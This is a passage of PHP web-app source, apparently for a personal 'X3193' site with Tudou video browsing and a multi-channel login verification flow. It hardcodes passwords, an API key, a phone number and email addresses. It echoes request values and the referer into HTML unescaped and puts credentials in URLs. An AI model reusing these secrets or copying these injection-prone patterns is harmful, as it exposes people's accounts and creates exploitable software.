                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=tudou&action=".encodeuri("media.view")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mediacode=".encodeuri($mediaitemcode)."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".encodeuri($page)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."\">".trim($mediatitle)."</a>";?>
                <?php                		
               		}
                ?>  
                </td>
			<?php 
			//$str = array();
			//$str = split(",",$mediatags);
			//$array_size = count($str);
			//while(!(--$array_size < 0)){ 
			//	echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim($str[$array_size]))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>".$str[$array_size]."</a> ";
			//}	
			?>
                <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">查看</a>";?> 下载 
                </td>
        </tr>   
                	<?php 
                }
                ?>
                </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="30" >
                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>首页</a> ";
                if (floor($page)>1)
                        echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>下一页</a> ";
                echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($medialist['pagecount'])."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>末页</a> ";
               				?>
                				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();

                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
        		}
        	}
                break; 
        case "media.view":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        GoBack('1');
                        break;
                }        
        ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="35" class="tdtbg" valign="middle">
                        <form action="<?php echo ScriptPath();?>?api=tudou&action=<?php echo encodeuri('media.search');?>" method="POST" name="tudou">
                        <input name="keyword" value="<?php  echo trim(request("keyword")); ?>" style="height:20px;width:90px;font-size:11px;" <?php  $style->input("#f9f9f9",""); ?>>
                        <SELECT name="mediaclassid" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          						$mediaclassid = $tudou_media->tudoumediaclassid();
												?>
                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">视频分类</OPTION>
                        <?php 
	          	//print_r($mediaclassid);
                        for($i = 0; $i < count($mediaclassid);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaclassid[$i]['code'];?>" <?php  if (trim(request('mediaclassid')) == $mediaclassid[$i]['code']) echo 'selected';?>><?php  echo $mediaclassid[$i]['type'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediaday" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaday = $tudou_media->tudoumediaday();
			?>
                        <OPTION VALUE="<?php  echo $mediaday[0]['day'];?>">发布时间</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediaday);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaday[$i]['day'];?>" <?php  if (trim(request('mediaday')) == $mediaday[$i]['day']) echo 'selected';?>><?php  echo $mediaday[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediatime" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatime = $tudou_media->tudoumediatime();
			?>
                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">播放时间</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediatime);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediatime[$i]['time'];?>" <?php  if (trim(request('mediatime')) == $mediatime[$i]['time']) echo 'selected';?>><?php  echo $mediatime[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediatype" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatype = $tudou_media->tudoumediatype();
			?>
                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">媒体类型</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediatype);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediatype[$i]['type'];?>" <?php  if (trim(request('mediatype')) == $mediatype[$i]['type']) echo 'selected';?>><?php  echo $mediatype[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediaorder" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaorder = $tudou_media->tudoumediaorder();
			?>
                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">媒体排序</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediaorder);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaorder[$i]['order'];?>" <?php  if (trim(request('mediaorder')) == $mediaorder[$i]['order']) echo 'selected';?>><?php  echo $mediaorder[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">默认...</OPTION>
                        </SELECT>

                        <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->input("#f9f9f9","") ?>>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="submit" class="button" name="btnSubmit" value=" Go ">
                        <?php 
                      	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
                      	?>
                        &nbsp;<a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a>
                      	<?php 	
                      	}	
                        else{
                        ?>
                        &nbsp;<a  style="" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="上传视频到土豆服务器">登入</a>
                        <?php 
                      	}
                        ?>
                </td>
        </tr>   
</table>
                        <?php 
    		    		       	$tudou_media = new tudou_class();
		    		           	$mediainfo = $tudou_media->tudoumediaiteminfo(trim(request('mediacode')));
		    		           	//print_r($mediainfo);
		    		           	//return;
												?>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"><?php echo $mediainfo['mediatitle'];?> <A style="" HREF='<?php echo trim($_SERVER['HTTP_REFERER']);?>'>返回</A></td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"><?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> [  <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">退出</a> ] <?php  } ?></td>
        </tr>
</table>
<table width="95%" height="75%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" valign="center" colspan="3">
<table align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3">
									<embed src="http://www.tudou.com/v/<?php echo trim(request('mediacode'));?>/&cbs=2&vbc=9&autoPlay=true/v.swf" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" autostart='true' controls='console' volume="100" wmode="opaque" width="600" height="450"></embed> 
                </td>
        </tr>
</table>
								</td>
        </tr>
</table>
	  		<?php 
	  		
                break;
        default:
                      	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
	                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".trim('media.ulist')."&checkcode=".trim(request("checkcode")));
	                    		return;
	                    	}	
    
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=tudou&action=<?php  echo encodeuri("media.ulist");?>&skin=<?php  echo $skincolor;?>" method="POST" name="tudou">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>> 
                        &nbsp验证码：<input <?php  $style->input("#f9f9f9",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
               </td>
        </tr>   
</table>
<?php               
                break;          
}
$style->footer();

}
?>

<?php 
function xmpphp(){

#Use XMPPHP_Log::LEVEL_VERBOSE to get more logging for error reports
#If this doesn't work, are you running 64-bit PHP with < 5.2.6?
$conn = new XMPPHP_XMPP('talk.google.com', 5222, 'x3193@g.x3193.tk', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
try {
    $conn->connect();
    $conn->processUntil('session_start');
    $conn->presence();
    $conn->message('xcy6272003@gmail.com', iconv('gb2312','utf-8','This is a test message!'.trim(request('msg'))));
    $conn->disconnect();
} 
catch(XMPPHP_Exception $e) {
    die($e->getMessage());
}

}
?>

<?php 
function blank(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');

$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 验证");
$ipverify = 'n'; // y or n 单纯IP验证
$smsverify = 'y'; // y or n 纯短信认证
//echo $smsverify;
//echo $ipowner.'gg';   
$IPFilter = new IPFilter('');
$ipallow = $IPFilter->IPlimiter();
$redirecturl = syssetini().'&serverip='.trim($_SERVER['SERVER_NAME'])."&verify=";
$iplimiter = arrmember(checkip($ipallow,$redirecturl),'1');
$verifymethod = 'fetion';
//echo $iplimiter.'fffffl';

//echo $_SESSION["X3193"]['global'][$iplimiter]['verify']['success'].' '.$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];
//exit;

if (strtolower(trim(request('verify'))) != 'fetion' && strtolower(trim(request('verify'))) != 'sendcloud' && strtolower(trim(request('verify'))) != 'xmpp' && strtolower(trim(request('verify'))) != 'gcal' && strtolower(trim(request('verify'))) != 'sim' && strtolower(trim(request('verify'))) != 'msn' && strtolower(trim(request('verify'))) != 'email' && strtolower(trim(request('verify'))) != 'gtalk' && strtolower(trim(request('verify'))) != 'voxeo' && strtolower(trim(request('verify'))) != 'yahoo') {
		//redirect($redirecturl);
		//union_redirect($redirecturl);
		//session_write_close();		
		//session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
		//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
		//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
		//ini_set('session.gc_divisor',1);
		//session_start();
		//session_destroy();	
		passthru("find /var/lib/openshift/5419a3585004461665000be4/php/sessions/ -type f -empty -delete",$result);	
   	return;      
}
elseif($verifymethod != strtolower(trim(request('verify')))){
		//session_destroy();	
		passthru("find /var/lib/openshift/5419a3585004461665000be4/php/sessions/ -type f -empty -delete",$result);		
   	return;
}

//echo $verifymethod . strtolower(trim(request('verify')));

if(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) == '' && strtoupper(trim(request('msgverifycode'))) == ''){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = '';
unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
//unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']);
//unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']);
setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "",time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] = randcode(32,'');
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = randcode(8,'number');

        if (0){
        	
        }
        else{
       	
      if (strtolower(trim(request('verify'))) == 'sim'){
                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！','gb2312');
				      		$voxeo = new voxeo_class();
                  $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','The code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);        
      }   
      elseif (strtolower(trim(request('verify'))) == 'email'){

                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'，IP地址为：'.$_SERVER['REMOTE_ADDR'],'gb2312');
     }   
      elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193正在验证您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //echo $result;
  	  }      
      elseif (strtolower(trim(request('verify'))) == 'xmpp'){
         $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
             $conn->connect();
             $conn->processUntil('session_start');
             $conn->presence();
             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
             $conn->disconnect();
      }   
      elseif (strtolower(trim(request('verify'))) == 'msn'){
					$sendMsg = new sendMsg();
					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
					//echo $sendMsg->result.' '.$sendMsg->error;
      }   
      elseif (strtolower(trim(request('verify'))) == 'smtp'){
				$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        $smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193正在验证您的访问权限'), iconv('gb2312','gb2312','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      }      
      elseif (strtolower(trim(request('verify'))) == 'gcal'){
              	$google_calendar = new google_class();
              	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193正在验证您的访问权限,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
      }
      elseif (strtolower(trim(request('verify'))) == 'voxeo'){
   					 $voxeo = new voxeo_class();
             $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      }
      elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));	// 接收人手机号、飞信内容   
							exit;   	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      }      
      redirect(httppath().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
		}
}
elseif(trim(request('verify')) != '' && trim(request('verifycode')) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) == ''){
        
session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}
        
        if (0){
      		echo $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'];
        }
        else{
	//echo trim($_SERVER["SERVER_NAME"]);        	
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">

<table width="95%" height="89" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="">
        <tr>
                <td align="center" valign='middle'>
                        <form action="<?php  echo httppath().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=';?>" method="post" name="dnspod">
                        &nbsp短信验证码：<input type="text" class="text" name="msgverify" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>

<?php         
        }
}
elseif(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) != '' && strlen(trim(request('msgverify'))) == '8'){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

            if($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] == trim(request('verifycode')) && $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] == trim(request('msgverify')) ){
                        if (0){
                        }
                        else{
     	 if (strtolower(trim(request('verify'))) == 'sim'){
                              //mail('xcy6272003@126.com','X3193已经成功验证了您的访问权限','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                        $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                              
                      }        
            elseif (strtolower(trim(request('verify'))) == 'email'){
                  $html = new mail_class();
